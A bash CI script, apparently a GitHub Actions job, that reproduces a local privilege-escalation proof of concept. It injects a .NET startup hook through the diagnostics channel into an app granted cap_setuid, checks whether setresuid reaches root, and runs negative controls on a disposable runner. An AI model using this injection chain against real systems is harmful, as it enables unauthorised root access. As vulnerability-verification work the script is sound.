#!/usr/bin/env bash
set -Eeuo pipefail
umask 022

LAB="$RUNNER_TEMP/r16-diag-filecap-v2"
OUT="$GITHUB_WORKSPACE/r16-output"
SDK="$LAB/dotnet"
BUILD="$LAB/build"
SDK_URL="https://builds.dotnet.microsoft.com/dotnet/Sdk/10.0.402/dotnet-sdk-10.0.402-linux-x64.tar.gz"
SDK_SHA512="1904a98dda2db34ba78ba3c4fb1b224455329af91c341d83547843c1839e112b04ae699ee92fa2449a8f62249196a938723078c0c60b9f65c88539d5687729c2"

rm -rf "$LAB" "$OUT"
mkdir -p "$SDK" "$BUILD" "$OUT/cases"
exec > >(tee "$OUT/workflow.stdout.txt") 2> >(tee "$OUT/workflow.stderr.txt" >&2)

cat > "$OUT/environment.txt" <<EOF
utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)
runner_os=$RUNNER_OS
runner_arch=$RUNNER_ARCH
kernel=$(uname -a)
user=$(id)
sdk_url=$SDK_URL
sdk_sha512=$SDK_SHA512
diagnostics_client_version=0.2.745401
EOF

printf '[1/8] Acquire and verify official SDK 10.0.402\n'
curl --fail --location --retry 5 --retry-all-errors --connect-timeout 20 \
  --output "$LAB/dotnet-sdk.tar.gz" "$SDK_URL"
printf '%s  %s\n' "$SDK_SHA512" "$LAB/dotnet-sdk.tar.gz" | sha512sum -c - | tee "$OUT/sdk-sha512-check.txt"
tar -xzf "$LAB/dotnet-sdk.tar.gz" -C "$SDK"
export DOTNET_ROOT="$SDK"
export PATH="$SDK:$PATH"
export DOTNET_CLI_TELEMETRY_OPTOUT=1
export DOTNET_NOLOGO=1
export NUGET_PACKAGES="$LAB/nuget"
dotnet --info | tee "$OUT/dotnet-info.txt"
sha256sum "$SDK/dotnet" "$SDK/shared/Microsoft.NETCore.App/10.0.13/libcoreclr.so" \
  "$SDK/shared/Microsoft.NETCore.App/10.0.13/System.Private.CoreLib.dll" \
  | tee "$OUT/runtime-sha256.txt"

printf '[2/8] Build owned fixture and pinned diagnostics client\n'
cp -a "$GITHUB_WORKSPACE/r16" "$OUT/source"
dotnet publish "$GITHUB_WORKSPACE/r16/Victim/Victim.csproj" -c Release -r linux-x64 --self-contained true \
  -p:PublishSingleFile=false -p:DebugType=None -o "$BUILD/victim" | tee "$OUT/build-victim.txt"
dotnet build "$GITHUB_WORKSPACE/r16/Hook/Hook.csproj" -c Release -p:DebugType=None -o "$BUILD/hook" | tee "$OUT/build-hook.txt"
dotnet publish "$GITHUB_WORKSPACE/r16/Client/Client.csproj" -c Release -r linux-x64 --self-contained true \
  -p:PublishSingleFile=false -p:DebugType=None -o "$BUILD/client" | tee "$OUT/build-client.txt"
dotnet list "$GITHUB_WORKSPACE/r16/Client/Client.csproj" package --include-transitive | tee "$OUT/client-packages.txt"
sha256sum "$BUILD/victim/Victim" "$BUILD/victim/Victim.dll" "$BUILD/hook/R16Hook.dll" "$BUILD/client/Client" \
  | tee "$OUT/fixture-sha256.txt"

printf '[3/8] Install root-owned immutable targets\n'
sudo rm -rf /opt/r16 /var/lib/r16
sudo mkdir -p /opt/r16/filecap /opt/r16/ordinary /opt/r16/tools/client
sudo cp -a "$BUILD/victim/." /opt/r16/filecap/
sudo cp -a "$BUILD/victim/." /opt/r16/ordinary/
sudo cp -a "$BUILD/client/." /opt/r16/tools/client/
sudo cp "$BUILD/hook/R16Hook.dll" /opt/r16/tools/R16Hook.dll
sudo chown -R root:root /opt/r16
sudo chmod -R a-w /opt/r16
sudo find /opt/r16 -type d -exec chmod 0755 {} +
sudo find /opt/r16 -type f -exec chmod 0644 {} +
sudo chmod 0755 /opt/r16/filecap/Victim /opt/r16/ordinary/Victim /opt/r16/tools/client/Client
sudo setcap cap_setuid+ep /opt/r16/filecap/Victim
getcap -n /opt/r16/filecap/Victim /opt/r16/ordinary/Victim | tee "$OUT/apphost-capabilities.txt"
stat -c '%n mode=%a uid=%u gid=%g size=%s' /opt/r16/filecap/Victim /opt/r16/ordinary/Victim \
  | tee "$OUT/apphost-stat.txt"

HOME_DIR="$HOME"
HOOK_DLL="$(readlink -f "$BUILD/hook/R16Hook.dll")"
CLIENT="$(readlink -f "$BUILD/client/Client")"
CROSS_CLIENT="/opt/r16/tools/client/Client"
CROSS_HOOK="/opt/r16/tools/R16Hook.dll"
printf 'not a managed assembly\n' > "$BUILD/invalid-hook.bin"
chmod 0644 "$BUILD/invalid-hook.bin"

wait_for_file() {
  local file="$1" limit="${2:-100}"
  for _ in $(seq 1 "$limit"); do
    [[ -e "$file" ]] && return 0
    sleep 0.1
  done
  return 1
}

start_case() {
  local name="$1" binary="$2" extra_name="${3:-}" extra_value="${4:-}"
  local c="$OUT/cases/$name"
  mkdir -p "$c"
  rm -f "$c/ready.json" "$c/stop" "$c/hook-evidence.json"
  local protected="/var/lib/r16/$name"
  sudo mkdir -p "$protected"
  sudo chown root:root "$protected"
  sudo chmod 0700 "$protected"
  local nonce
  nonce="$(python3 - <<'PY'
import secrets
print(secrets.token_hex(16))
PY
)"
  printf '%s\n' "$nonce" > "$c/nonce.txt"
  local env_args=(
    "HOME=$HOME_DIR"
    "PATH=/usr/bin:/bin"
    "TMPDIR=/tmp"
    "R16_PROTECTED_MARKER=$protected/marker.json"
    "R16_HOOK_EVIDENCE=$c/hook-evidence.json"
    "R16_NONCE=$nonce"
  )
  if [[ -n "$extra_name" ]]; then env_args+=("$extra_name=$extra_value"); fi
  env -i "${env_args[@]}" "$binary" "$c/ready.json" "$c/stop" > "$c/victim.stdout.txt" 2> "$c/victim.stderr.txt" &
  CASE_PID=$!
  printf '%s\n' "$CASE_PID" > "$c/pid.txt"
  if ! wait_for_file "$c/ready.json" 200; then
    printf 'ready timeout\n' > "$c/ready-timeout.txt"
    return 1
  fi
  cp "/proc/$CASE_PID/status" "$c/proc-status.txt" || true
  : > "$c/socket-paths.txt"
  for _ in $(seq 1 100); do
    find /tmp -maxdepth 1 -type s -name "dotnet-diagnostic-$CASE_PID-*-socket" -printf '%p\n' > "$c/socket-paths.txt" || true
    [[ -s "$c/socket-paths.txt" ]] && break
    sleep 0.1
  done
  while IFS= read -r sock; do
    [[ -n "$sock" ]] && stat -c '%n mode=%a uid=%u gid=%g' "$sock"
  done < "$c/socket-paths.txt" > "$c/socket-stat.txt" || true
}

stop_case() {
  local name="$1" pid="$2" c="$OUT/cases/$name"
  touch "$c/stop"
  for _ in $(seq 1 100); do
    ! kill -0 "$pid" 2>/dev/null && break
    sleep 0.1
  done
  if kill -0 "$pid" 2>/dev/null; then sudo kill "$pid" || true; fi
  set +e
  wait "$pid"
  local rc=$?
  set -e
  printf '%s\n' "$rc" > "$c/victim-exit.txt"
  sudo find "/var/lib/r16/$name" -maxdepth 1 -type f -printf '%p mode=%m uid=%U gid=%G size=%s\n' \
    > "$c/protected-files.txt" 2>/dev/null || true
  if sudo test -f "/var/lib/r16/$name/marker.json"; then
    sudo cat "/var/lib/r16/$name/marker.json" > "$c/protected-marker.json"
    sudo stat -c '%n mode=%a uid=%u gid=%g size=%s' "/var/lib/r16/$name/marker.json" > "$c/protected-marker-stat.txt"
  fi
}

run_client() {
  local case_name="$1" client="$2" pid="$3" hook="$4"
  local c="$OUT/cases/$case_name"
  set +e
  "$client" "$pid" "$hook" > "$c/client.json" 2> "$c/client.stderr.txt"
  local rc=$?
  set -e
  printf '%s\n' "$rc" > "$c/client-exit.txt"
}

printf '[4/8] Run positive and causal controls\n'

start_case positive /opt/r16/filecap/Victim
pid=$CASE_PID
run_client positive "$CLIENT" "$pid" "$HOOK_DLL"
wait_for_file /var/lib/r16/positive/marker.json 150 || true
wait_for_file "$OUT/cases/positive/hook-evidence.json" 150 || true
stop_case positive "$pid"

start_case ordinary /opt/r16/ordinary/Victim
pid=$CASE_PID
run_client ordinary "$CLIENT" "$pid" "$HOOK_DLL"
wait_for_file "$OUT/cases/ordinary/hook-evidence.json" 150 || true
stop_case ordinary "$pid"

start_case envhook /opt/r16/filecap/Victim DOTNET_STARTUP_HOOKS "$HOOK_DLL"
pid=$CASE_PID
sleep 2
stop_case envhook "$pid"

start_case diagdisabled /opt/r16/filecap/Victim DOTNET_EnableDiagnostics 0
pid=$CASE_PID
run_client diagdisabled "$CLIENT" "$pid" "$HOOK_DLL"
sleep 1
stop_case diagdisabled "$pid"

start_case invalidhook /opt/r16/filecap/Victim
pid=$CASE_PID
run_client invalidhook "$CLIENT" "$pid" "$BUILD/invalid-hook.bin"
sleep 1
stop_case invalidhook "$pid"

start_case crossuid /opt/r16/filecap/Victim
pid=$CASE_PID
set +e
sudo -u nobody "$CROSS_CLIENT" "$pid" "$CROSS_HOOK" > "$OUT/cases/crossuid/client.json" 2> "$OUT/cases/crossuid/client.stderr.txt"
rc=$?
set -e
printf '%s\n' "$rc" > "$OUT/cases/crossuid/client-exit.txt"
sleep 1
stop_case crossuid "$pid"

printf '[5/8] Verify immutable target and classify matrix\n'
sudo getcap -n /opt/r16/filecap/Victim /opt/r16/ordinary/Victim > "$OUT/apphost-capabilities-after.txt"
sha256sum /opt/r16/filecap/Victim /opt/r16/ordinary/Victim > "$OUT/apphost-sha256-after.txt"
diff -u "$OUT/apphost-capabilities.txt" "$OUT/apphost-capabilities-after.txt" > "$OUT/capability-diff.txt" || true

python3 - "$OUT" <<'PY'
import json, pathlib, re, sys
out = pathlib.Path(sys.argv[1])

def read_json(p):
    try: return json.loads(p.read_text())
    except Exception: return None

def intval(p, default=None):
    try: return int(p.read_text().strip())
    except Exception: return default

def marker(case): return (out/'cases'/case/'protected-marker.json').exists()
def ready(case): return read_json(out/'cases'/case/'ready.json') or {}
def evidence(case): return read_json(out/'cases'/case/'hook-evidence.json') or read_json(out/'cases'/case/'protected-marker.json') or {}
def capeff(case):
    p=out/'cases'/case/'proc-status.txt'
    text=p.read_text(errors='replace') if p.exists() else ''
    m=re.search(r'^CapEff:\s*([0-9a-fA-F]+)', text, re.M)
    return int(m.group(1),16) if m else 0

checks = {}
pr, pe = ready('positive'), evidence('positive')
ore, oe = ready('ordinary'), evidence('ordinary')
checks['positive_target_started_nonroot'] = pr.get('euid') not in (None, 0)
checks['positive_secure_exec_dumpable'] = pr.get('dumpable') in (0, 2)
checks['positive_cap_setuid_effective'] = bool(capeff('positive') & (1 << 7))
checks['positive_request_accepted'] = intval(out/'cases/positive/client-exit.txt') == 0
checks['positive_hook_loaded_exact_pid'] = pe.get('pid') == pr.get('pid')
checks['positive_setresuid_succeeded'] = pe.get('setresuidRc') == 0 and pe.get('afterEuid') == 0
checks['positive_protected_marker'] = marker('positive')
checks['positive_nonce_bound'] = pe.get('nonce') == (out/'cases/positive/nonce.txt').read_text().strip()
checks['ordinary_target_dumpable'] = ore.get('dumpable') == 1
checks['ordinary_hook_loaded'] = bool(oe)
checks['ordinary_setresuid_denied'] = oe.get('setresuidRc') not in (None, 0) and oe.get('afterEuid') != 0
checks['ordinary_no_protected_marker'] = not marker('ordinary')
checks['environment_hook_blocked'] = not marker('envhook') and not (out/'cases/envhook/hook-evidence.json').exists()
checks['diagnostics_disabled_rejected'] = intval(out/'cases/diagdisabled/client-exit.txt') not in (None, 0) and not marker('diagdisabled')
checks['invalid_hook_no_marker'] = not marker('invalidhook')
checks['cross_uid_denied'] = intval(out/'cases/crossuid/client-exit.txt') not in (None, 0) and not marker('crossuid')
checks['positive_socket_owner_only'] = 'mode=600' in (out/'cases/positive/socket-stat.txt').read_text(errors='replace')
checks['apphost_still_root_owned'] = 'uid=0 gid=0' in (out/'apphost-stat.txt').read_text(errors='replace')

load_bearing = [
  'positive_target_started_nonroot','positive_secure_exec_dumpable','positive_cap_setuid_effective',
  'positive_request_accepted','positive_hook_loaded_exact_pid','positive_setresuid_succeeded',
  'positive_protected_marker','positive_nonce_bound','ordinary_target_dumpable','ordinary_hook_loaded',
  'ordinary_setresuid_denied','ordinary_no_protected_marker','environment_hook_blocked',
  'diagnostics_disabled_rejected','invalid_hook_no_marker','cross_uid_denied',
  'positive_socket_owner_only','apphost_still_root_owned'
]
verdict = 'TECHNICAL_EOP_POC_POSITIVE' if all(checks.get(x) for x in load_bearing) else 'DISPROVED_OR_GATE_FAILED'
result = {
  'schema':'r16-diag-filecap-result-v2',
  'verdict':verdict,
  'checks':checks,
  'passed':sum(bool(v) for v in checks.values()),
  'total':len(checks),
  'loadBearingChecks':load_bearing,
  'runtime':'10.0.13','sdk':'10.0.402','diagnosticsClient':'0.2.745401',
  'scope':'Disposable GitHub-hosted Ubuntu 24.04 runner; owned fixture only',
  'notClaims':['No production target','No private duplicate clearance','No submission','No deployment-prevalence claim']
}
(out/'RESULT.json').write_text(json.dumps(result,indent=2)+'\n')
(out/'RESULT.txt').write_text(verdict+'\n'+json.dumps(checks,indent=2)+'\n')
print(json.dumps(result,indent=2))
PY

printf '[6/8] Seal evidence\n'
sudo chown -R "$(id -u):$(id -g)" "$OUT"
find "$OUT" -type f ! -name SHA256SUMS.txt ! -name MANIFEST.json -print0 | sort -z | xargs -0 sha256sum > "$OUT/SHA256SUMS.txt"
python3 - "$OUT" <<'PY'
import hashlib, json, pathlib, sys
root=pathlib.Path(sys.argv[1]); files=[]
for p in sorted(root.rglob('*')):
    if p.is_file() and p.name != 'MANIFEST.json':
        h=hashlib.sha256(p.read_bytes()).hexdigest()
        files.append({'path':p.relative_to(root).as_posix(),'bytes':p.stat().st_size,'sha256':h})
(root/'MANIFEST.json').write_text(json.dumps({'schema':'r16-manifest-v2','files':files},indent=2)+'\n')
PY

printf '[7/8] Create delivery archive\n'
tar -C "$GITHUB_WORKSPACE" -czf "$GITHUB_WORKSPACE/r16-diag-filecap-evidence.tar.gz" r16-output
sha256sum "$GITHUB_WORKSPACE/r16-diag-filecap-evidence.tar.gz" | tee "$OUT/EVIDENCE_ARCHIVE_SHA256.txt"

printf '[8/8] Final result\n'
cat "$OUT/RESULT.txt"
